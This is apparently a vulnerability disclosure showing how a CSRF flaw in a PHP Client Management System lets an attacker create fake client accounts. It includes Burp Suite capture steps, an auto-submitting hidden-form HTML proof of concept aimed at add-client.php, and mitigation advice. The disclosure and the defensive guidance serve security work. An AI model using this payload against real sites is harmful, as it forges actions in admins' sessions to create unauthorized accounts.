# CSRF Vulnerability: Creating Fake Users in Client Management System

## Introduction
Cross-Site Request Forgery (CSRF) is an attack where an authenticated user is tricked into submitting a malicious request to a web application. This can lead to unauthorized actions being performed on behalf of the user . In this report, we demonstrate how CSRF can be used to create fake users in a **Client Management System** and suggest mitigation strategies.

## Environment Setup
- Locally hosted **Client Management System** using **MySQL** and **PHP**.
- Functionality for adding clients and their services.

## Steps to Exploit CSRF

### 1. Login as Admin
Using provided credentials, log in to the Client Management System.

![Login as admin](https://github.com/user-attachments/assets/a52b86de-a945-424a-89fc-ef538af11ac0)

### 2. Add a New Client
- Select **Add Client** option.
- Enter the required client details.

![Adding new client](https://github.com/user-attachments/assets/f4589658-3bc8-485b-beec-f58280c63c91)
![Enter the client details](https://github.com/user-attachments/assets/a0a89e2d-743a-4bf0-887d-24ed8c9629d5)

### 3. Capture the Client Adding Request
1. Navigate to the **Save** button.
2. Set up **Burp Suite** to intercept requests.
3. Click **Save** and capture the HTTP request before it reaches the server.
4. Send the captured request to the **Repeater** tab for analysis.

![Capturing the request in Burp](https://github.com/user-attachments/assets/2c3978f6-8518-4ca1-89c3-cc7a22a7cebe)
![Send to repeater](https://github.com/user-attachments/assets/be30ff6c-4dc5-4f18-af61-11bd81c526d1)

## CSRF Exploit Code
Below is the **HTML PoC** for CSRF attack:

```html
<html>
  <body>
    <form action="http://localhost/clientms/admin/add-client.php" method="POST">
      <input type="hidden" name="accounttype" value="Active Account" />
      <input type="hidden" name="cname" value="moulimurugan" />
      <input type="hidden" name="comname" value="kppr" />
      <input type="hidden" name="address" value="vijayamangalam" />
      <input type="hidden" name="city" value="erode" />
      <input type="hidden" name="state" value="tamil" />
      <input type="hidden" name="zcode" value="638026" />
      <input type="hidden" name="wphnumber" value="968560710" />
      <input type="hidden" name="cellphnumber" value="6931052465" />
      <input type="hidden" name="ophnumber" value="9638560410" />
      <input type="hidden" name="email" value="moulimurugan@gmail.com" />
      <input type="hidden" name="password" value="moulimurugan" />
      <input type="hidden" name="websiteadd" value="clientmsdb" />
      <input type="hidden" name="notes" value="Nil" />
      <input type="hidden" name="submit" value="" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## Creating Fake Users
- Modify existing details to create **fake users**.

![Adding fake user 1](https://github.com/user-attachments/assets/4b45fb41-3c40-4a6b-9dcf-525fc02eceaa)
![Adding fake user 2](https://github.com/user-attachments/assets/feb6cc10-f6b7-4276-ba5f-41e026f3fba2)

### Testing the CSRF PoC
1. Open the generated **CSRF PoC link** in a browser.
2. The webpage opens with a **Submit** button.
3. Click **Submit**, and the request executes, creating fake users.

![Open PoC in browser](https://github.com/user-attachments/assets/68b10332-3cc8-4d9c-8ccf-46af830ad9ba)
![Hit submit request](https://github.com/user-attachments/assets/59d29d18-7911-4f2b-b115-38946be339f8)

## Confirming Fake Clients Creation
- After submission, fake clients appear in the admin dashboard.

![Fake clients created](https://github.com/user-attachments/assets/ce96ec9b-4f7d-470c-89ed-a63bb79a341f)
![Multiple users created](https://github.com/user-attachments/assets/878be82c-87de-4201-aa4f-c08ed785fc20)

## Mitigation Strategies
To prevent CSRF attacks, implement the following measures:

1. **CSRF Tokens**
   - Use **anti-CSRF tokens** in all form submissions and verify them on the server-side.
2. **SameSite Cookies**
   - Set session cookies with `SameSite=Strict` or `SameSite=Lax` attributes.
3. **Referer and Origin Header Validation**
   - Validate the **Referer** and **Origin** headers before processing requests .
4. **User Authentication Checks**
   - Require **CAPTCHAs** for critical actions to prevent automated attacks .
5. **Restrict HTTP Methods**
   - Use `POST` for sensitive actions and **avoid processing GET requests** with side effects .

## Conclusion
This report demonstrates how CSRF vulnerabilities can be exploited to create unauthorized accounts in a **Client Management System**. Implementing the suggested mitigation strategies will help secure the application against such attacks.
